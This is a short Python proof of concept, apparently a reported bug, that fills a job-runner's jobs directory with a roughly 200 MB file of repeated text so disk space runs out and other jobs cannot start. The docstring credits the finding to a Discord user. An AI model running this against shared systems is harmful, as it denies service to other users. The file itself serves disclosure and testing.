"""
Description
    Writing a large file to disk in the jobs directory, exhausting the
    space will temporarly disable other jobs to be started.

Discovered by
    Discord     Derpius#9144
"""

with open("beans","w") as f:
    n = 2**24
    f.write("I love beans\n"*n)